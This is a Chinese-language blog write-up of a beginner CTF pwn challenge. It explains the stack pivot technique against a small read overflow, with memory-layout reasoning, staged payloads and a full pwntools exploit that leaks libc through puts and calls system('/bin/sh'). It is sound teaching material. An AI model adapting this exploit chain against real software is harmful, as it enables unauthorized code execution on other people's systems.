@@ -1,0 +1,760 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/666.jpg">
+  <link rel="icon" href="/img/666.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#ffffff">
+  <meta name="author" content="roxy">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="题目出自哪里已经记不真切了 只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下 来看看吧! 题目逻辑非常之简单 123456789undefined8 main(EVP_PKEY_CTX *param_1)&#123;  undefined1 local_58 [80];    init(param_1);  puts(&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="stack pivot">
+<meta property="og:url" content="https://rr00xxyy.github.io/2025/12/25/stack-pivot/index.html">
+<meta property="og:site_name" content="roxy&#39;s blog">
+<meta property="og:description" content="题目出自哪里已经记不真切了 只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下 来看看吧! 题目逻辑非常之简单 123456789undefined8 main(EVP_PKEY_CTX *param_1)&#123;  undefined1 local_58 [80];    init(param_1);  puts(&amp;quot">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rr00xxyy.github.io/images/4.png">
+<meta property="article:published_time" content="2025-12-24T21:26:45.000Z">
+<meta property="article:modified_time" content="2026-02-12T14:02:20.425Z">
+<meta property="article:author" content="roxy">
+<meta property="article:tag" content="ret2libc">
+<meta property="article:tag" content="内存布局">
+<meta property="article:tag" content="栈迁移">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://rr00xxyy.github.io/images/4.png">
+  
+  
+  
+  <title>stack pivot - roxy&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/mui-fluid.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"rr00xxyy.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body class="post-page post-page">
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/a.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="stack pivot"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-12-25 05:26" pubdate>
+          2025年12月25日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.3k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          28 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">stack pivot</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>题目出自哪里已经记不真切了</p>
+<p>只依稀记得这是我正式做的第一道pwn题，当时的我就像刚出新手村的菜鸟遇见了大boss一般，与其鏖战了数个日夜才终于拿下</p>
+<p>来看看吧!</p>
+<p>题目逻辑非常之简单</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c">undefined8 <span class="hljs-title function_">main</span><span class="hljs-params">(EVP_PKEY_CTX *param_1)</span><br>&#123;<br>  undefined1 local_58 [<span class="hljs-number">80</span>];<br>  <br>  init(param_1);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Xswlhhh!Use stack hijacking on him!&quot;</span>);<br>  read(<span class="hljs-number">0</span>,local_58,<span class="hljs-number">0x60</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>题目的保护只有<code>NX</code></p>
+<p>但是这在当时对于只会无脑溢出覆盖返回地址的我来说宛如噩梦，设置了local_58[80]，然而read只有0x60的大小，也就是说算上<code>saved rbp</code>只剩下最后的8个字节供我覆盖rip，而题目又有<code>NX</code>，长度完全不够执行rop链!怎么办呢?我查询资料，得知存在一种技术叫做:<code>栈迁移(stack pivot)</code></p>
+<p>原理在于，将<code>saved rbp</code>覆盖为你想让rbp去的地方，将rip覆盖为再执行一次read的地址，因此执行逻辑便变为，main函数结束后，即将退出，执行<code>leave; ret;</code>的指令，而<code>saved rbp</code>已经被设置为我们想让它去的地方(通常是一个可读可写的地址段)，rip又一次执行read，最后在那个段空间重新分配一个新的栈帧，供我们自由发挥</p>
+<p>这里有一些前置知识需要理解，当时困扰了我许久，现在写下来，首先是<code>leave; ret;</code>干了什么，你可以将其理解为两个阶段，先是leave，其相当于<code>mov rsp,rbp</code>和<code>pop rbp</code>，注意，最后，<code>rsp += 8</code>，然后执行<code>ret</code>指令，相当于<code>rip = *rsp</code>，注意，同样，<code>rsp += 8</code>，接下来，如何理解栈帧?其实cpu并不在乎rbp在哪里，它只关心执行流要干什么事儿</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asm">LEA RAX =&gt; local_58,[RBP + -0x50]<br></code></pre></td></tr></table></figure>
+
+<p>read始于local_58[80]的地址，local_58[80]这个数组始终位于<code>rbp - 0x50</code>的位置，而<code>rbp + 0x8</code>的位置便是<code>rip</code>，栈帧布局永远如此，无论rbp在哪里，因此给了我们伪造新栈帧的利用空间</p>
+<p>所以第一段payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)  <span class="hljs-comment">#相当于重新执行一次read</span><br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
+
+<p>这时一个新的栈帧在bss段中形成了</p>
+<p>我们在新的栈帧中有了充足的空间来写rop链，因此便十分<em>easy</em>了，就打一个ret2libc吧，先来泄露libc基址</p>
+<p>payload如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
+
+<p>第一次看这个payload应该还是蛮懵的，不过对照着<code>leave; ret;</code>的含义在内存布局中多自己分析推导几遍便能理解其妙处所在，这里便不展开了</p>
+<p>大致画一下内存布局供你分析</p>
+<p><img src="/images/4.png" srcset="/img/loading.gif" lazyload alt="内存布局"></p>
+<p>接下来接收得到的puts真实地址并计算libc基址</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br></code></pre></td></tr></table></figure>
+
+<p>注意上述payload执行完后我们又回到了main函数，此时rsp经过一系列弹栈，应该位于<code>0x404810</code>的位置，而main函数起始处的指令再次布置了栈帧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asm">push rbp<br>mov rbp,rsp<br>sub rsp,0x50<br></code></pre></td></tr></table></figure>
+
+<p>这段理解起来确实比较复杂，还是那句话，多动手调试(善用你的gdb)，思考，分析<em>汇编</em>，<strong>rsp</strong>，<strong>rbp</strong>，<strong>rip</strong>，<em>内存</em>等的变化</p>
+<p>此时在新的栈帧上，类似于上面，我们布置我们的最终payload</p>
+<p>如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)  <span class="hljs-comment">#对齐!</span><br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br></code></pre></td></tr></table></figure>
+
+<p>最后也是成功拿到shell</p>
+<p>如果你彻底理解了这道题目，并能完整推理一遍过程，恭喜你，大抵是彻底理解了<code>stack pivot</code>这门技术，接下来迎接你的即将是更为复杂的栈布局，你加油，我也加油…</p>
+<p>最后补一下完整exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf =ELF(<span class="hljs-string">&quot;./pivot&quot;</span>,<span class="hljs-literal">False</span>) <span class="hljs-comment">#本地...</span><br>libc = ELF(<span class="hljs-string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>,<span class="hljs-literal">False</span>)<br>context.binary = elf<br>sh = elf.process()<br><br>pop_rdi_ret = <span class="hljs-number">0x401225</span><br>leave_ret = <span class="hljs-number">0x40121b</span><br>ret = leave_ret + <span class="hljs-number">1</span><br><br>payload = <span class="hljs-string">b&quot;A&quot;</span> * <span class="hljs-number">0x50</span><br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>))<br>payload += p64(<span class="hljs-number">0x4011e3</span>)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br><br>payload = p64(pop_rdi_ret) + p64(elf.got[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.plt[<span class="hljs-string">&quot;puts&quot;</span>])<br>payload += p64(elf.sym[<span class="hljs-string">&quot;main&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(elf.bss(<span class="hljs-number">0x800</span>-<span class="hljs-number">0x58</span>))<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>libc.address = u64(sh.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&quot;\0&quot;</span>)) - libc.sym[<span class="hljs-string">&quot;puts&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;libc @&quot;</span>,<span class="hljs-built_in">hex</span>(libc.address))<br>payload = p64(pop_rdi_ret) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))<br>payload += p64(ret)<br>payload += p64(libc.sym[<span class="hljs-string">&quot;system&quot;</span>])<br>payload = payload.ljust(<span class="hljs-number">0x50</span>,<span class="hljs-string">b&quot;\0&quot;</span>)<br>payload += p64(<span class="hljs-number">0x4047b0</span>)<br>payload += p64(leave_ret)<br>sh.sendafter(<span class="hljs-string">b&quot;\n&quot;</span>,payload)<br><br>sh.interactive()<br></code></pre></td></tr></table></figure>
+
+<p>感谢阅读…</p>
+<p>生活愉快!</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        
+        
+          <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="print-no-link">#栈迁移</a>
+        
+      
+        
+        
+          <a href="/tags/%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80/" class="print-no-link">#内存布局</a>
+        
+      
+        
+        
+          <a href="/tags/ret2libc/" class="print-no-link">#ret2libc</a>
+        
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>stack pivot</div>
+      <div>https://rr00xxyy.github.io/2025/12/25/stack-pivot/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>roxy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年12月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2026年2月12日</div>
+        </div>
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/12/25/SROP/" title="SROP">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SROP</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/12/25/a-strange-rop/" title="a_strange_rop">
+                        <span class="hidden-mobile">a_strange_rop</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+      <span class="footer-quote">It is no use crying over spilt milk</span>
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="/js/mui-fluid.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
